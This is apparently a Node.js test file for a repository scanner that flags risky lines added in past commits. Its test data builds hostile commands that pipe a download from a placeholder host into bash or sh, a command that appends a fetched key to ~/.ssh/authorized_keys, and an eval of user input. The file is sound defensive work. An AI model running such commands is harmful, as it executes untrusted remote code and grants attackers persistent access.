import assert from "node:assert/strict";
import { mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import test from "node:test";
import {
  isScannable,
  lineStillPresent,
  scanInserts,
  scanLine,
} from "../scripts/scan-previous-inserts.mjs";

test("ignores prose and scans code and scripts", () => {
  assert.equal(isScannable("README.md"), false);
  assert.equal(isScannable("web/app.js"), true);
  assert.equal(isScannable("contracts/MyToken.sol"), true);
  assert.equal(isScannable("Makefile"), true);
  assert.equal(isScannable(".github/workflows/foundry.yml"), true);
});

test("flags high-severity inserts", () => {
  const piped = ["curl https://example.invalid/setup |", "bash"].join(" ");
  assert.ok(scanLine(piped).some((hit) => hit.id === "pipe-download-to-shell"));

  const keys = [
    "curl https://example.invalid/k >> ~/.ssh/",
    "authorized_keys",
  ].join("");
  assert.ok(scanLine(keys).some((hit) => hit.id === "authorized-keys-append"));

  const dynamic = ["ev", "al(userInput)"].join("");
  assert.ok(scanLine(dynamic).some((hit) => hit.id === "dynamic-eval"));
  assert.equal(scanLine("const total = a + b;").length, 0);
});

test("ignores inserted lines that are no longer in the file", () => {
  const root = mkdtempSync(path.join(tmpdir(), "scan-inserts-"));
  const file = "scripts/setup.sh";
  writeFileSync(path.join(root, "setup.sh"), "echo ok\n");
  const removed = {
    file: "setup.sh",
    text: ["wget https://example.invalid/x", "| sh"].join(" "),
  };
  assert.equal(lineStillPresent(root, removed), false);
  writeFileSync(path.join(root, "setup.sh"), `${removed.text}\n`);
  assert.equal(lineStillPresent(root, removed), true);
  assert.equal(file.endsWith(".sh"), true);
});

test("reports file and commit for a matching insert", () => {
  const findings = scanInserts([
    {
      commit: "abc123",
      file: "scripts/setup.sh",
      line: 4,
      text: ["wget https://example.invalid/x |", "sh"].join(" "),
    },
    {
      commit: "abc123",
      file: "README.md",
      line: 1,
      text: "notes",
    },
  ]);
  assert.equal(findings.length, 1);
  assert.equal(findings[0].file, "scripts/setup.sh");
  assert.equal(findings[0].line, 4);
  assert.equal(findings[0].severity, "high");
});
